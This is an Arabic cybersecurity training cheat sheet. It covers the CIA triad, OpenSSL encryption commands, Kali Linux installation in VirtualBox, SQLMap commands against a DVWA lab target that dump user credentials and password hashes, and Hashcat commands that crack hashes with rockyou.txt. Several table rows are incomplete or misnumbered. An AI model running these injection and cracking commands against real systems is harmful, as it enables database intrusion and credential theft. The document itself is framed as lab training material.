1. الأمن السيبراني (Cybersecurity)

التعريف:

حماية الأنظمة، الشبكات، والبيانات من الوصول غير المصرح به، التعديل، أو التلف، مع ضمان استمرارية الأعمال الرقمية.

الثالوث الأمني (CIA Triad):

  • Confidentiality (السرية): حماية البيانات من الوصول غير المصرح به.
  • Integrity (التكامل): التأكد من أن البيانات لم يتم تعديلها أو العبث بها.
  • Availability (التوافر): ضمان وصول البيانات والخدمات عند الحاجة إليها.

أهم 5 مبادئ للحماية الشخصية:

  1. تحديث النظام والبرامج بانتظام.
  2. كلمات مرور قوية وفريدة لكل حساب.
  3. تمكين المصادقة الثنائية (2FA).
  4. النسخ الاحتياطي الدوري للبيانات.
  5. المراقبة المستمرة والتوعية بالتهديدات.

2. نظام Windows

ما هو Windows:

نظام تشغيل من Microsoft لإدارة العتاد والبرمجيات والتطبيقات.

أهميته في اختبار الاختراق:

  • انتشار واسع بين المستخدمين والشركات، مما يجعله هدفاً شائعاً.
  • يحتوي على خدمات قابلة للاختبار التعليمي (SMB، RDP، IIS).
  • بيئة مثالية لمختبرات التدريب القانونية باستخدام الأجهزة الافتراضية.

3. التشفير (Encryption)

المفهوم:

تحويل البيانات من نص واضح (Plaintext) إلى نص مشفر (Ciphertext) والعكس.

أنواع التشفير:

متماثل (Symmetric):

يستخدم نفس المفتاح للتشفير وفك التشفير، مثل AES.

غير متماثل (Asymmetric):

يستخدم مفتاح عام للتشفير ومفتاح خاص لفك التشفير، مثل RSA.

تعليمات Openssl المتقدمة (Encryption Commands):

الوصف الأمر التنفيذي
توليد مفتاح RSA خاص بطول 2048 بت
openssl genrsa -out private.key 2048
استخراج المفتاح العام من الخاص
openssl rsa -in private.key -pubout -out public.key
تشفير ملف باستخدام AES-256-CBC
openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc -k "YourPassphrase"
فك تشفير الملف المشفر سابقًا
openssl enc -d -aes-256-cbc -in secret.enc -out secret.txt -k "YourPassphrase"
توقيع رقمّي للملف باستخدام المفتاح الخاص
openssl dgst -sha256 -sign private.key -out file.sig file.txt
التحقق من التوقيع باستخدام المفتاح العام
openssl dgst -sha256 -verify public.key -signature file.sig file.txt
توليد طلب شهادة CSR
openssl req -new -key private.key -out request.csr
تشفير نص باستخدام AES-128
echo "SecretMessage" | openssl enc -aes-128-cbc -a -salt -pass pass:1234
فك تشفير نص AES-128
echo "EncryptedText" | openssl enc -aes-128-cbc -d -a -pass pass:1234
تحويل PEM إلى DER
openssl rsa -in private.key -outform DER -out private.der
توليد SHA256 Hash للملف
openssl dgst -sha256 file.txt
توليد MD5 Hash للملف
openssl dgst -md5 file.txt
تشفير ملف باستخدام DES
openssl enc -des-cbc -in secret.txt -out secret.des
فك تشفير DES
openssl enc -d -des-cbc -in secret.des -out secret.txt
توليد مفتاح DH
openssl dhparam -out dhparam.pem 2048
تشفير رسالة باستخدام RSA
openssl rsautl -encrypt -inkey public.key -pubin -in message.txt -out message.enc
فك تشفير رسالة RSA
openssl rsautl -decrypt -inkey private.key -in message.enc -out message.txt
عرض تفاصيل شهادة X.509
openssl x509 -in certificate.crt -text -noout
تحويل شهادة CRT إلى PEM
openssl x509 -in certificate.crt -out certificate.pem -outform PEM
إنشاء شهادة موقعة ذاتياً
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout selfsigned.key -out selfsigned.crt

4. تحميل وإعداد كالي لينكس

البحث والتحميل:

  • ابحث في Google عن: Kali Linux download official
  • اختر الموقع الرسمي: https://www.kali.org/get-kali
  • اختر النسخة المناسبة: ISO Installer (64-bit) للتثبيت الكامل، أو VirtualBox / VMware Image للتشغيل السريع في جهاز افتراضي.
  • حمّل النسخة الرسمية.

إعداد الجهاز الافتراضي (VirtualBox VM):

  1. امنح الجهاز اسماً (مثل Kali) وحدد النوع Linux والنسخة Debian (64-bit).
  2. حدد الذاكرة: 2048 ميجابايت فما فوق.
  3. اختر القرص الصلب الافتراضي: VDI, Dynamically allocated, 20 GB+.
  4. ابدأ تشغيل الجهاز واختر ملف ISO الذي حملته.

التثبيت:

  1. اختر Graphical Install.
  2. اختر اللغة، المنطقة، لوحة المفاتيح.
  3. أعد إعداد الشبكة واسم المضيف.
  4. اختيار القرص: Use Entire Disk.
  5. أنشئ مستخدم عادي (أو مستخدم Root حسب الحاجة التدريبية).
  6. الانتهاء وإعادة التشغيل.

4. SQLMap - الاستغلال التلقائي لـ SQL Injection

الوصفالأمر التنفيذي
كشف قواعد البيانات على هدف الاختبار (DVWA)
sqlmap -u "http://<TARGET_HOST>/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --dbs
فحص مدخل محدد لحقن SQL على الهدف
sqlmap -u "http://<TARGET_HOST>/test.php?id=1" -p id --dbs
عرض جداول قاعدة بيانات dvwa على الهدف
sqlmap -u "http://<TARGET_HOST>/test.php?id=1" -D dvwa --tables
كشف أعمدة جدول users على الهدف
sqlmap -u "http://<TARGET_HOST>/test.php?id=1" -D dvwa -T users --columns
استخراج بيانات من الجدول على الهدف
sqlmap -u "http://<TARGET_HOST>/test.php?id=1" -D dvwa -T users -C username,password --dump
تشغيل SQLMap باستخدام طلب محفوظ (مرّر عبر بروكسي محلي)
sqlmap -r request.txt --proxy="http://127.0.0.1:8080" --dbs
استخدام تقنية Union Injection تلقائيًا
sqlmap -u "http://<TARGET_HOST>/test.php?id=1" --technique=U --batch
تعيين مستوى الخطر والدقة
sqlmap -u "http://<TARGET_HOST>/test.php?id=1" --risk=3 --level=5
زيادة سرعة الفحص بعدة خيوط
sqlmap -u "http://<TARGET_HOST>/test.php?id=1" --threads=5
استخراج Banner قاعدة البيانات على الهدف
sqlmap -u "http://<TARGET_HOST>/test.php?id=1" --banner
معرفة المستخدم الحالي للقاعدة على الهدف
sqlmap -u "http://<TARGET_HOST>/test.php?id=1" --current-user
معرفة قاعدة البيانات الحالية على الهدف
sqlmap -u "http://<TARGET_HOST>/test.php?id=1" --current-db
استخراج كلمات المرور المشفرة (محليًا) من الهدف التعليمي
sqlmap -u "http://<TARGET_HOST>/test.php?id=1" --passwords
فتح Terminal على النظام المحلي التعليمي في الهدف

تعيين أعلى مستوى فحص للحقن

تعيين مستوى الخطر للاختبارات

10. Hashcat - كسر الـ Hashes (GPU Accelerated)

الوصفالأمر التنفيذي

كسر SHA256
hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

hashcat -m 0 --force hash.txt wordlist.txt

hashcat -m 0 -a 6 hash.txt wordlist.txt ?d?d?d

hashcat -m 0 --increment hash.txt wordlist.txt
